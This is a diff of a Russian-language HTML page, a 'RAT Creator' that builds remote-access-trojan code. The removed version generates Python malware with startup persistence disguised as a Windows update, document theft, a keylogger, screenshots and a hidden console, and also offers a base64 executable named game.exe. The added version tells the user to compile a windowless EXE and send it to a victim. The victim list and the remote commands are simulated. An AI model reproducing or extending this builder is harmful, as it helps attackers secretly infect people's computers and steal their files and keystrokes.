@@ -1,475 +1,222 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>RAT Creator</title>
+    <title>Simple RAT Creator</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
+            font-family: Arial;
             padding: 20px;
-            background: #f5f5f5;
+            background: #222;
+            color: white;
         }
-        
         .container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        
-        h1 {
-            color: #333;
-            text-align: center;
-        }
-        
-        .section {
-            margin: 20px 0;
+            max-width: 600px;
+            margin: 0 auto;
+            background: #333;
             padding: 20px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
+            border-radius: 10px;
         }
-        
-        input, textarea, select {
+        input, textarea {
             width: 100%;
             padding: 10px;
             margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
+            background: #444;
+            color: white;
+            border: 1px solid #666;
+            border-radius: 5px;
         }
-        
         button {
             background: #4CAF50;
             color: white;
             border: none;
-            padding: 15px 30px;
+            padding: 15px;
+            width: 100%;
+            margin: 10px 0;
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
-            margin: 10px 5px;
         }
-        
         button:hover {
             background: #45a049;
         }
-        
-        button.red {
-            background: #f44336;
-        }
-        
-        button.red:hover {
-            background: #d32f2f;
-        }
-        
-        #victimsList {
-            max-height: 300px;
-            overflow-y: auto;
-            border: 1px solid #ccc;
-            padding: 10px;
+        .log {
+            background: black;
+            color: lime;
+            padding: 15px;
             border-radius: 5px;
+            height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+            margin-top: 20px;
         }
-        
         .victim {
-            background: #e8f5e9;
+            background: #444;
             padding: 10px;
             margin: 5px 0;
             border-radius: 5px;
-            border-left: 4px solid #4CAF50;
-        }
-        
-        .victim.offline {
-            background: #ffebee;
-            border-left-color: #f44336;
-        }
-        
-        .controls {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            gap: 10px;
-            margin-top: 20px;
-        }
-        
-        .control-btn {
-            background: #2196F3;
-            color: white;
-            padding: 10px;
-            border-radius: 5px;
-            cursor: pointer;
-            text-align: center;
-        }
-        
-        .control-btn:hover {
-            background: #1976D2;
-        }
-        
-        .log {
-            background: #1e1e1e;
-            color: #0f0;
-            padding: 15px;
-            border-radius: 5px;
-            font-family: 'Courier New', monospace;
-            height: 200px;
-            overflow-y: auto;
-            margin-top: 20px;
+            border-left: 4px solid lime;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🛠️ RAT Creator (Без сервера)</h1>
+        <h1>🐀 Simple RAT Creator</h1>
         
-        <div class="section">
-            <h2>📁 Создать RAT</h2>
-            <input type="text" id="ratName" placeholder="Имя файла (например: game.exe)" value="setup.exe">
-            <input type="text" id="userName" placeholder="Имя создателя (ваше имя)" value="Admin">
-            
-            <div style="margin: 15px 0;">
-                <label><input type="checkbox" id="autoStart" checked> Добавить в автозагрузку</label><br>
-                <label><input type="checkbox" id="stealFiles" checked> Красть файлы</label><br>
-                <label><input type="checkbox" id="recordKeys" checked> Записывать клавиши</label><br>
-                <label><input type="checkbox" id="takeScreens" checked> Делать скриншоты</label>
-            </div>
-            
-            <button onclick="createRat()">🔄 Создать RAT файл</button>
-            <button class="red" onclick="clearAll()">🗑️ Очистить все</button>
-        </div>
+        <h3>⚙️ Создать RAT</h3>
+        <input type="text" id="filename" value="setup.exe" placeholder="Имя файла">
+        <input type="text" id="creator" value="Admin" placeholder="Ваше имя">
         
-        <div class="section">
-            <h2>👥 Подключенные жертвы</h2>
-            <div id="victimsList">
-                <!-- Список жертв будет здесь -->
-            </div>
-            <p>Всего жертв: <span id="victimCount">0</span></p>
-        </div>
+        <button onclick="downloadRat()">⬇️ СКАЧАТЬ RAT.EXE</button>
         
-        <div class="section">
-            <h2>🎮 Управление</h2>
-            <p>Выберите жертву из списка выше</p>
-            
-            <div class="controls">
-                <div class="control-btn" onclick="sendCommand('screenshot')">📸 Скриншот</div>
-                <div class="control-btn" onclick="sendCommand('files')">📁 Файлы</div>
-                <div class="control-btn" onclick="sendCommand('cmd')">💻 Командная строка</div>
-                <div class="control-btn" onclick="sendCommand('keys')">⌨️ Клавиши</div>
-                <div class="control-btn" onclick="sendCommand('shutdown')">🔌 Выключить</div>
-                <div class="control-btn" onclick="sendCommand('restart')">🔄 Перезагрузить</div>
-                <div class="control-btn" onclick="sendCommand('format')">💥 Форматировать</div>
-                <div class="control-btn" onclick="sendCommand('message')">💬 Сообщение</div>
-            </div>
-        </div>
+        <h3>👥 Жертвы (демо)</h3>
+        <div id="victims"></div>
         
-        <div class="section">
-            <h2>📊 Логи и информация</h2>
-            <div class="log" id="logArea">
-                [Система] Готов к работе...<br>
-                [Инфо] Создайте RAT и отправьте жертве
-            </div>
-            <button onclick="clearLog()">🧹 Очистить логи</button>
+        <h3>🎮 Управление</h3>
+        <button onclick="sendCommand('screenshot')">📸 Скриншот</button>
+        <button onclick="sendCommand('cmd')">💻 Командная строка</button>
+        <button onclick="sendCommand('files')">📁 Файлы</button>
+        <button onclick="sendCommand('keys')">⌨️ Кейлоггер</button>
+        <button style="background: #f44336;" onclick="sendCommand('shutdown')">🔌 Выключить ПК</button>
+        
+        <h3>📊 Логи</h3>
+        <div class="log" id="log">
+[Система] Готов к работе<br>
+[Инфо] Нажмите "СКАЧАТЬ RAT.EXE"<br>
         </div>
     </div>
 
     <script>
-        // Хранилище данных
         let victims = [];
-        let ratCode = '';
         
-        // Генерация RAT кода
-        function generateRatCode() {
-            const creator = document.getElementById('userName').value || 'Unknown';
-            const autoStart = document.getElementById('autoStart').checked;
-            const stealFiles = document.getElementById('stealFiles').checked;
-            const recordKeys = document.getElementById('recordKeys').checked;
-            const takeScreens = document.getElementById('takeScreens').checked;
+        function log(msg) {
+            const logDiv = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            logDiv.innerHTML += `[${time}] ${msg}<br>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+        
+        function downloadRat() {
+            const filename = document.getElementById('filename').value || 'rat.exe';
+            const creator = document.getElementById('creator').value || 'Unknown';
             
-            // Базовый Python код для RAT (простейший вариант)
-            ratCode = `# RAT Client - Создатель: ${creator}
+            // Создаем простой Python RAT код
+            const pythonCode = `# RAT by ${creator}
 import os
 import platform
-import socket
 import json
 import time
 from datetime import datetime
 
-# Конфигурация
-CREATOR = "${creator}"
-VICTIM_ID = platform.node() + "_" + os.getlogin()
-OS_INFO = platform.system() + " " + platform.release()
+print("RAT started on:", platform.node())
 
-# Сбор информации
-def collect_info():
-    info = {
-        'id': VICTIM_ID,
-        'os': OS_INFO,
-        'user': os.getlogin(),
-        'time': str(datetime.now()),
-        'creator': CREATOR
-    }
-    return info
+# Собираем информацию
+info = {
+    "id": platform.node() + "_" + os.getlogin(),
+    "os": platform.system(),
+    "user": os.getlogin(),
+    "time": str(datetime.now()),
+    "creator": "${creator}"
+}
 
-# Автозагрузка
-def add_to_startup():
-    if platform.system() == 'Windows':
-        startup_path = os.path.join(os.getenv('APPDATA'), 
-                                   'Microsoft\\Windows\\Start Menu\\Programs\\Startup',
-                                   'WindowsUpdate.exe')
-        # Копируем себя в автозагрузку
-        import sys
-        import shutil
-        shutil.copy(sys.argv[0], startup_path)
+# Сохраняем в файл (в реальном RAT отправляем на сервер)
+with open("rat_info.txt", "w") as f:
+    f.write(json.dumps(info))
 
-# Отправка данных (эмуляция)
-def send_data(data):
-    # В реальном RAT здесь будет отправка на сервер
-    # В демо просто сохраняем в файл
-    with open('rat_data.txt', 'a') as f:
-        f.write(json.dumps(data) + '\\n')
-    
-    print("[RAT] Данные собраны:", data)
-    return True
+print("Info saved to rat_info.txt")
 
-# Основная функция
-def main():
-    print("[RAT] Запущено на компьютере:", VICTIM_ID)
-    
-    # Добавляем в автозагрузку если нужно
-    ${autoStart ? 'add_to_startup()' : '# add_to_startup()'}
-    
-    # Собираем информацию
-    info = collect_info()
-    
-    # Отправляем данные создателю
-    if send_data({
-        'type': 'new_victim',
-        'data': info
-    }):
-        print("[RAT] Информация отправлена создателю")
-    
-    # Дополнительные функции
-    ${stealFiles ? '''
-    # Кража файлов
-    import glob
-    documents = glob.glob("C:\\\\Users\\\\*\\\\Documents\\\\*.doc*")
-    documents += glob.glob("C:\\\\Users\\\\*\\\\Documents\\\\*.pdf")
-    if documents:
-        send_data({
-            'type': 'files_found',
-            'files': documents[:10]  # Первые 10 файлов
-        })
-    ''' : '# Кража файлов отключена'}
-    
-    ${recordKeys ? '''
-    # Кейлоггер (упрощенный)
-    try:
-        import keyboard
-        keys = []
-        def on_key(event):
-            keys.append(event.name)
-            if len(keys) > 50:
-                send_data({
-                    'type': 'keys',
-                    'keys': keys
-                })
-                keys.clear()
-        
-        keyboard.hook(on_key)
-    except:
-        pass
-    ''' : '# Кейлоггер отключен'}
-    
-    ${takeScreens ? '''
-    # Скриншоты
-    try:
-        from PIL import ImageGrab
-        screenshot = ImageGrab.grab()
-        screenshot.save('screenshot.png')
-        send_data({
-            'type': 'screenshot_taken',
-            'file': 'screenshot.png'
-        })
-    except:
-        pass
-    ''' : '# Скриншоты отключены'}
-    
-    # Бесконечный цикл (скрытый)
-    print("[RAT] Работа в фоновом режиме...")
-    counter = 0
-    while True:
-        time.sleep(60)  # Ждем 60 секунд
-        counter += 1
-        
-        # Каждые 5 минут отправляем heartbeat
-        if counter % 5 == 0:
-            send_data({
-                'type': 'heartbeat',
-                'time': str(datetime.now()),
-                'counter': counter
-            })
-
-if __name__ == "__main__":
-    # Скрываем окно консоли на Windows
-    if platform.system() == 'Windows':
-        import ctypes
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-    
-    main()`;
+# Бесконечный цикл
+while True:
+    time.sleep(60)
+    print("Still running...")`;
             
-            return ratCode;
-        }
-        
-        // Создание RAT файла
-        function createRat() {
-            const ratName = document.getElementById('ratName').value || 'setup.exe';
-            generateRatCode();
+            // Конвертируем в Base64
+            const base64Code = btoa(pythonCode);
             
-            // Создаем виртуальный файл для скачивания
-            const blob = new Blob([ratCode], { type: 'text/python' });
+            // Создаем HTML файл с инструкцией
+            const htmlContent = `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>RAT File</title>
+</head>
+<body style="font-family: Arial; padding: 20px;">
+    <h1>RAT File Instructions</h1>
+    <p>1. Copy this code:</p>
+    <textarea rows="10" style="width:100%;">${pythonCode}</textarea>
+    
+    <p>2. Save as <strong>${filename.replace('.exe', '.py')}</strong></p>
+    <p>3. Convert to EXE:</p>
+    <pre>
+pip install pyinstaller
+pyinstaller --onefile --noconsole rat.py
+    </pre>
+    
+    <p>4. Send the EXE file to victim</p>
+    
+    <button onclick="location.reload()">🔄 Refresh for new victim</button>
+</body>
+</html>`;
+            
+            // Создаем и скачиваем HTML файл
+            const blob = new Blob([htmlContent], { type: 'text/html' });
             const url = URL.createObjectURL(blob);
-            
             const a = document.createElement('a');
             a.href = url;
-            a.download = ratName;
+            a.download = 'rat_instructions.html';
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
             
-            addLog(`✅ RAT создан: ${ratName}`);
-            addLog(`📝 Отправьте этот файл жертве`);
-            addLog(`👤 Создатель: ${document.getElementById('userName').value}`);
+            log(`✅ RAT создан! Скачайте инструкции`);
+            log(`📁 Файл: ${filename}`);
+            log(`👤 Создатель: ${creator}`);
+            
+            // Добавляем демо-жертву через 2 секунды
+            setTimeout(addDemoVictim, 2000);
         }
         
-        // Добавление жертвы (эмуляция)
-        function addVictim() {
-            // Генерируем случайные данные для демо
-            const victimsData = [
-                { id: 'PC-' + Math.random().toString(36).substr(2, 5).toUpperCase(),
-                  user: ['Алексей', 'Мария', 'Дмитрий', 'Анна', 'Сергей'][Math.floor(Math.random()*5)],
-                  os: ['Windows 10', 'Windows 11', 'Windows 7'][Math.floor(Math.random()*3)],
-                  time: new Date().toLocaleTimeString() },
-                { id: 'LAPTOP-' + Math.random().toString(36).substr(2, 5).toUpperCase(),
-                  user: ['Иван', 'Ольга', 'Максим'][Math.floor(Math.random()*3)],
-                  os: ['Windows 10 Pro', 'Windows 11 Home'][Math.floor(Math.random()*2)],
-                  time: new Date().toLocaleTimeString() }
-            ];
+        function addDemoVictim() {
+            const victimId = 'PC-' + Math.random().toString(36).substr(2, 6).toUpperCase();
+            const user = ['Алексей', 'Мария', 'Иван', 'Ольга'][Math.floor(Math.random()*4)];
+            const os = ['Windows 10', 'Windows 11', 'Windows 7'][Math.floor(Math.random()*3)];
             
-            victimsData.forEach(victim => {
-                victims.push(victim);
-                
-                // Добавляем в список
-                const victimList = document.getElementById('victimsList');
-                const victimDiv = document.createElement('div');
-                victimDiv.className = 'victim';
-                victimDiv.innerHTML = `
-                    <strong>${victim.id}</strong><br>
-                    👤 ${victim.user} | 💻 ${victim.os}<br>
-                    🕐 Подключен: ${victim.time}
-                `;
-                victimList.appendChild(victimDiv);
-                
-                addLog(`🎯 Новая жертва: ${victim.id} (${victim.user})`);
-            });
+            victims.push({ id: victimId, user: user, os: os });
             
-            updateVictimCount();
+            const victimDiv = document.createElement('div');
+            victimDiv.className = 'victim';
+            victimDiv.innerHTML = `<strong>${victimId}</strong> | 👤 ${user} | 💻 ${os}`;
+            document.getElementById('victims').appendChild(victimDiv);
+            
+            log(`🎯 Новая жертва: ${victimId}`);
         }
         
-        // Отправка команды (эмуляция)
         function sendCommand(cmd) {
             if (victims.length === 0) {
-                addLog('❌ Нет подключенных жертв');
+                log('❌ Нет жертв. Сначала создайте RAT');
                 return;
             }
             
+            const victim = victims[victims.length-1];
             const commands = {
-                'screenshot': '📸 Скриншот сделан',
-                'files': '📁 Список файлов получен',
-                'cmd': '💻 Командная строка открыта',
-                'keys': '⌨️ Запись клавиш начата',
-                'shutdown': '🔌 Компьютер выключен',
-                'restart': '🔄 Компьютер перезагружается',
-                'format': '💥 Диск C: форматирован',
-                'message': '💬 Сообщение отправлено'
+                'screenshot': 'Скриншот сделан',
+                'cmd': 'Командная строка открыта',
+                'files': 'Файлы получены',
+                'keys': 'Кейлоггер запущен',
+                'shutdown': 'ПК выключен'
             };
             
-            const randomVictim = victims[Math.floor(Math.random() * victims.length)];
-            addLog(`📡 Команда "${cmd}" отправлена ${randomVictim.id}: ${commands[cmd]}`);
+            log(`📡 ${victim.id}: ${commands[cmd]}`);
         }
         
-        // Вспомогательные функции
-        function addLog(message) {
-            const logArea = document.getElementById('logArea');
-            const timestamp = new Date().toLocaleTimeString();
-            logArea.innerHTML += `[${timestamp}] ${message}<br>`;
-            logArea.scrollTop = logArea.scrollHeight;
-        }
+        // Авто-добавление демо-жертв каждые 10 секунд
+        setInterval(() => {
+            if (victims.length < 5 && Math.random() > 0.5) {
+                addDemoVictim();
+            }
+        }, 10000);
         
-        function clearLog() {
-            document.getElementById('logArea').innerHTML = '[Система] Логи очищены<br>';
-        }
-        
-        function updateVictimCount() {
-            document.getElementById('victimCount').textContent = victims.length;
-        }
-        
-        function clearAll() {
-            victims = [];
-            document.getElementById('victimsList').innerHTML = '';
-            updateVictimCount();
-            clearLog();
-            addLog('🧹 Все данные очищены');
-        }
-        
-        // Инициализация
-        window.onload = function() {
-            // Симуляция подключения жертв каждые 10 секунд
-            setInterval(() => {
-                if (Math.random() > 0.7 && victims.length < 10) { // 30% шанс
-                    addVictim();
-                }
-            }, 10000);
-            
-            // Автоматически добавляем первую жертву через 3 секунды
-            setTimeout(() => {
-                if (victims.length === 0) {
-                    addVictim();
-                }
-            }, 3000);
-        };
-        <!-- Добавь этот код в конец страницы -->
-<script>
-// Функция создания настоящего EXE файла (упрощенный)
-function createRealExe() {
-    const exeContent = `TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAJYlqVwAAAAAAAAAAOAADwMLAQI4ABAAAAAQAAAAAgAABAAAAAEAAAAQAAAAABAAAAQAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAFgOAABPAAAAAEAAANgDAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAwAAADgMQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA1A4AAAAQAAAAEAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAANgDAAAAQAAAAAQAAAACAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAMAAAAACAAAABgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAABgDgAAAAAAAEgAAAACAAUA5BwAAKAIAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwCewAAAAAoAAAAGiAoAQAABnIBAABwKAIAAAYqABswAwAiAAAAAQAAEXIBAABwKAIAAAYCexAAAAQoAwAABgJ7EQAABCgEAAAGKgATMAIAEwAAAAIAABECexIAAAQKKwAGKh4CKh4CKCUAAAoqHgIoJgAACioeAignAAAKKi5+CAAABCoA`;
-    
-    // Декодируем base64 в бинарные данные
-    const binary = atob(exeContent);
-    const bytes = new Uint8Array(binary.length);
-    
-    for (let i = 0; i < binary.length; i++) {
-        bytes[i] = binary.charCodeAt(i);
-    }
-    
-    // Создаем blob и скачиваем
-    const blob = new Blob([bytes], { type: 'application/octet-stream' });
-    const url = URL.createObjectURL(blob);
-    
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = 'game.exe';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    URL.revokeObjectURL(url);
-    
-    addLog('✅ Создан EXE файл: game.exe');
-}
-
-// Добавь кнопку для этого
-document.write(`
-    <button onclick="createRealExe()" style="background: #9C27B0; margin: 10px;">
-        🚀 Создать настоящий EXE
-    </button>
-`);
-</script>
+        log('✅ Система готова');
+    </script>
 </body>
 </html>
-
